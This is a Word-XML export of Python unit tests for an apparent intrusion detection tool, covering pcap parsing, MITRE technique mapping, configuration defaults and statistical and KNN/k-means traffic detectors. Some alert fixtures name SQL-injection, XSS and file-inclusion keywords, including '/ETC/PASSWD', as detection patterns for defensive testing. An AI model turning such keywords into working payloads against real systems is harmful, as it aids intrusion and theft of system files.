    <w:p w14:paraId="1E9F58E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2203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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF251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 = list(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6437A5F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E6E5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self.assertEqual([d for _, d, _ in out], frames)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460AA0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self.assertEqual([int(ts) for ts, _, _ in out],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C0C19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[1700000000, 1700000001, 1700000002])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD0735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0E47E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test_global_header_is_libpcap_conformant(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CD6F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pcap.PcapWriter(self.path, snaplen=96) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2E84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w.write(b"\x00" * 40)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9993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open(self.path, "rb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BE23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head = f.read(24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16677D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self.assertEqual(len(head), 24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4062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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10145C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magic, major, minor, tz, sig, snap, link = struct.unpack("&lt;IHHiIII",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78392C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                 head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445A85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self.assertEqual(magic, pcap.MAGIC_MICRO)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCD9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self.assertEqual((major, minor), (2, 4))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBFCE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self.assertEqual(snap, 96)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F4D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self.assertEqual(link, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32ED921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F099C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test_snaplen_truncates_but_records_original_length(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBB0E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header-only capture must still report the true on-wire size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39347F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pcap.PcapWriter(self.path, snaplen=32) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0C63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w.write(b"\x11" * 1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4AB9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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C1CB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ts, data, orig = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA913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self.assertEqual(len(data), 32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336822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self.assertEqual(orig, 1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFB33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BF9A7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test_microsecond_precision_preserved(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038D2A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pcap.PcapWriter(self.path) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5994F9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w.write(b"\x00" * 20, ts=1700000000.123456)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4325CD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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C415E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ts, _, _ = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C423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self.assertAlmostEqual(ts, 1700000000.123456, places=5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A3071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5344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test_rejects_non_pcap_file(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B82A7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open(self.path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E622E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f.write(b"this is not a capture file at all")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A95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with self.assertRaises(pcap.PcapError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F31D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pcap.PcapReader(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABAA1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BF4E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test_big_endian_capture_is_readable(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3436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captures written on a big-endian host must still parse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200D8C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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E01F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open(self.path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1D53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f.write(struct.pack("&gt;IHHiIII", pcap.MAGIC_MICRO, 2, 4, 0, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F103B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65535, 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC4E2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f.write(struct.pack("&gt;IIII", 1700000000, 500, 4, 4) + b"\xde\xad\xbe\xef")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3822AB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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251D26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self.assertEqual(r.endian, "&gt;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4ABA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ts, data, orig = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF066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self.assertEqual(data, b"\xde\xad\xbe\xef")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5492E3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234C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40B2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TestMitre(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFF7C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test_each_detection_maps_to_expected_technique(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775072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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644B8B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("DDoS DETECTED! Z-Score: 4.2 (PPS: 9000)", "T1498"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412C9F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("PORT SCAN DETECTED! (Unique Ports: 90/sec)", "T1046"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DDD2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("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']", "T1190"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DC3F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("BLACKLISTED IP DETECTED: 10.0.0.5 (Flagged)", "T1071"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737E27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49AB79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message, technique in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525E34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self.assertEqual(mitre.enrich(message)["technique_id"], technique)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0315926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9F31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test_payload_families_are_distinguished(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2F1D9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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8EEC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"MALICIOUS PAYLOAD! Keywords: ['UNION']"), "sqli")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F23BC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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69091E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"MALICIOUS PAYLOAD! Keywords: ['SCRIPT', 'ALERT(']"), "xss")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF220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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD330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"MALICIOUS PAYLOAD! Keywords: ['/ETC/PASSWD']"), "lfi")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D05A53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CA0D5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test_risk_score_is_bounded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2137D0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kind in mitre.TECHNIQUES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753B18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conf in (None, 0.0, 0.5, 1.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77270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score = mitre.risk_score(kind, conf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301211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self.assertGreaterEqual(score, 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40491E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self.assertLessEqual(score, 10.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502DB80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F94C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test_confidence_scales_risk_without_saturating(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF84B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low = mitre.risk_score("sqli", 0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5282A8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high = mitre.risk_score("sqli", 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79744F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self.assertLess(low, high)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1649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self.assertLessEqual(high, mitre.TECHNIQUES["sqli"]["base_score"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381655D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E7A5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test_severe_low_confidence_outranks_mild_high_confidence(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BE05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self.assertGreater(mitre.risk_score("sqli", 0.1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E870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mitre.risk_score("anomaly", 1.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4423784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C971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test_payload_families_group_for_policy(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E26D3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kind in ("sqli", "xss", "lfi", "payload"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029EC1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self.assertEqual(mitre.parent_kind(kind), "payload")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7FF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self.assertEqual(mitre.parent_kind("ddos"), "ddos")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C16C81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063F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test_unknown_message_is_not_fabricated(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B7EC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self.assertEqual(mitre.enrich("something unrelated")["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E6AE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"N/A")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB0C71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1D2ECE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D796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TestConfig(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C460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test_blocking_is_off_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AB67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NFR-3: active defence must be opt-in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A61E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self.assertFalse(Config().block_enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EA43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B32CB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test_privacy_defaults_match_nfr3(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B848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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BC73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self.assertTrue(c.privacy_mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B6F1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self.assertEqual(c.payload_excerpt_bytes, 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53674EF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4D3F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test_loopback_is_whitelisted_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578945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self.assertIn("127.0.0.1", Config().block_whitelist)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482E991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B51D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test_env_overrides_defaults_with_type_coercion(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4540EA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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667379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c.load_env({"MANTIS_BLOCK_ENABLED": "true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77010A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"MANTIS_ZSCORE_THRESHOLD": "4.5",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEBD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"MANTIS_ZSCORE_WINDOW": "60",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C901D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"MANTIS_BLOCK_ON": "ddos,scan"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBC12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self.assertIs(c.block_enabled, True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1E99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self.assertEqual(c.zscore_threshold, 4.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F1F8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self.assertEqual(c.zscore_window, 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E9F9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self.assertEqual(c.block_on, ["ddos", "scan"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6520D28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3AB4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test_json_file_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62363E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tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560EC9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105D2F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path = os.path.join(tmp, "c.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FAAA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import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685F98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open(path, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366E29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json.dump({"zscore_threshold": 2.5, "http_port": 9090}, f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B365B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c = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6077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self.assertTrue(c.load_file(path))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D30A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self.assertEqual(c.zscore_threshold, 2.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153D68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self.assertEqual(c.http_port, 9090)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDF17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5C9910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shutil.rmtree(tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7712BA4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8116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test_bad_env_value_does_not_crash(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0735E0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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F39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c.load_env({"MANTIS_ZSCORE_WINDOW": "not-a-number"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C5BA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self.assertEqual(c.zscore_window, 30)  # default retained</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A3C25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629D0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2EFC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TestZScoreCorrections(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8DDE2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"""Regression tests for the flood-recall defect."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C90961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DC0B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BASELINE = [10, 12, 11, 10, 13, 9, 11, 12, 10, 11]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A607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891B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test_welford_matches_two_pass_variance(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF4E4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z_score.MinimalistStats(window_size=100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE338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 in self.BASELINE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2401BE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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E9BE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mean, std = e.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F31D1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ref_mean = sum(self.BASELINE) / len(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254DCF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ref_std = math.sqrt(sum((x - ref_mean) ** 2 for x in self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352F78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/ len(self.BASELINE))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794168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self.assertAlmostEqual(mean, ref_mean, places=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4C90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self.assertAlmostEqual(std, ref_std, places=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D57D4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7C68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test_welford_is_stable_on_large_magnitudes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B4A0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naive sum-of-squares form loses precision here; Welford must not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44736E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z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B60C6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 in (1e8, 1e8 + 1, 1e8 + 2, 1e8 + 3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB2F5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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6FC6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_, std = e.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511FAB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self.assertAlmostEqual(std, math.sqrt(1.25), places=6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F561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9F4C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test_sustained_flood_is_detected_throughout(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5040FC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poisoning guard must keep alerting for the whole attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682672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z_score.MinimalistStats(window_size=10, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F48C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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C9FB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detections = sum(1 for _ in range(60) if e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC02A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self.assertEqual(detections, 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633E1F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439C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test_naive_baseline_absorbs_the_flood(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D0DD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documents the defect the guard fixes: without it recall collapses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC82D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z_score.MinimalistStats(window_size=10, threshold=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068621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guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BA46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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F37F6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detections = sum(1 for _ in range(60) if e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FA8D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self.assertLess(detections, 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670552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23EC4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test_normal_traffic_raises_no_alert(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0335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z_score.MinimalistStats(window_size=10, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3526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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0507CC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 in [10, 11, 12, 10, 9, 11, 13, 10]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174866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self.assertFalse(e.analyse(v).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F83E14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6624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test_low_volume_spike_is_not_mislabeled_as_ddos(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A56F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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C2A5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window_size=10, threshold=3.0, min_pps=500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5A66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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500E39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 = e.analyse(75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB9AD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self.assertGreater(verdict.detail["z_score"], 3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2F75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self.assertTrue(verdict.detail["statistical_anomaly"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B8C3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self.assertFalse(verdict.detail["volume_candidate"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2040E8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self.assertFalse(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752D50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self.assertEqual(e.history[-1], 75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6671A28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7426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test_live_sensor_requires_sustained_high_volume_spike(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E580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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697A6B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window_size=10, threshold=3.0, min_pps=500,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1874D6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required_consecutive=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555C7E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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586110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self.assertFalse(e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED0AE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self.assertFalse(e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C611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third = e.analyse(8000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379641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self.assertTrue(third.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A534F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self.assertTrue(third.detail["new_threat"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090DB0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fourth = e.analyse(8000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D259B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self.assertTrue(fourth.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CC9E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self.assertFalse(fourth.detail["new_threat"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F1214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9587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test_no_alert_before_warm_up(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7BAE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cold engine must not fire on its first observations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D647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z_score.MinimalistStats(window_size=30, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9007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self.assertFalse(e.analyse(50000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6C9EF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E1C8B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test_single_outlier_z_ceiling(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D33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z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390F87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v in self.BASELINE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CE25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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368BE2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self.assertAlmostEqual(e.max_detectable_z, 9 / math.sqrt(10), places=6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7BB8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59A62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490E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TestKNNFeatureScaling(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE0B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"""Regression tests for the flood-misclassified-as-scan defect."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CD41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5FC7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7E7A28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 = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6CEB1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08456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test_flood_is_not_reported_as_a_port_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE547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pps in (1500, 4000, 8000, 15000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A06F7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verdict, _ = self.e.classify(1, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085EFD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self.assertEqual(verdict, "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2FDD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"1 port @ %d pps misread as a scan" % pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5C2A0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C54F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test_zero_ports_can_never_be_a_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289025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Regression: an imported CIC-derived brain once labeled this Scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF6C4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self.e.train([[0, 50, "Scan"], [0, 100, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DA0F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[100, 120, "Scan"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A3616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self.assertEqual(self.e.training_data[0][2], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DD85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 = self.e.analyse(0, 75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385BAA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self.assertEqual(verdict.label, "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB85C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self.assertFalse(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB11DE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D592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test_low_port_ratio_is_not_a_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5369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High packet volume over a few ports is browsing or a flood, not a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F9D3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horizontal port scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602958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self.e.train([[100, 6000, "Scan"], [50, 3000, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D34E6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[1, 50, "Normal"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6183C7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self.assertEqual(self.e.classify(25, 1000)[0], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1789959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3C0F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test_scan_still_detected(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3CDE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ports, pps in ((45, 50), (200, 200), (400, 800)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D31C7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verdict, _ = self.e.classify(ports, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C10B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self.assertEqual(verdict, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF309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CD64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test_normal_browsing_still_normal(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758CFC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realistic client profiles: many packets spread over few ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC21B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ports, pps in ((1, 5), (2, 12), (12, 75), (25, 150), (27, 160)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA2C2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self.assertEqual(self.e.classify(ports, pps)[0], "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680C47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"%d ports / %d pkts misread as a scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2C1A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% (ports, pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FED15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2B0E4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test_low_volume_stealth_scan_is_detected(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07434D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deliberately slow scan stays below any volumetric threshold, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1214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only the ports/packets ratio can catch it: 20 ports in 30 packets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA3BF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cannot be 20 completed TCP conversations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5106AA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ports, pps in ((20, 30), (12, 18), (30, 40)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D76E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self.assertEqual(self.e.classify(ports, pps)[0], "Scan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC59D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"stealth scan %d ports / %d pkts missed"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E366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% (ports, pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C10C4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401BC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test_ratio_feature_separates_the_classes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A706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engineered third feature is what makes the boundary separable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA5D9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ranges = self.e.feature_ranges()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A335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self.assertEqual(len(ranges), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18415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self.assertEqual(self.e._features(30, 40)[2], 0.75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7F34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self.assertEqual(self.e._features(1, 1000)[2], 0.001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110E82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AE34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test_features_are_normalised_to_unit_range(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A16DB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low, high = self.e.feature_ranges()[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E357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self.assertEqual(self.e._scale([low, 0, 0])[0], 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619E5A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self.assertEqual(self.e._scale([high, 0, 0])[0], 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130F232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6C442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test_scaling_recomputed_after_training(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722966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before = self.e.feature_ranges()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394ECC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self.e.train([[5, 20, "Normal"], [900, 3000, "Scan"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFC3F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self.assertNotEqual(before, self.e.feature_ranges())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1EF6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4E5D3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E3F9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TestKMeansNovelty(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EE84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"""Regression tests for the engine that previously never fired."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145323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82C05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_warm(self, alpha=0.1, samples=25):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371AEA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kmeans.KMeansMonitor(k=3, learning_rate=alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E920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range(samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A414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e.analyse(10 + (i % 3), 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BE20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e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F8C63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D93A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test_no_alert_during_warm_up(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AE7F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kmeans.KMeansMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B642F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self.assertFalse(e.analyse(9000, 400).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D81AE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1DF7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test_familiar_traffic_is_not_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBE10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self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099755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range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA69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self.assertFalse(e.analyse(11, 2).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C46970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1D33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test_novel_traffic_is_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A44D9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self._warm()</w:t>
      </w:r>
    </w:p>
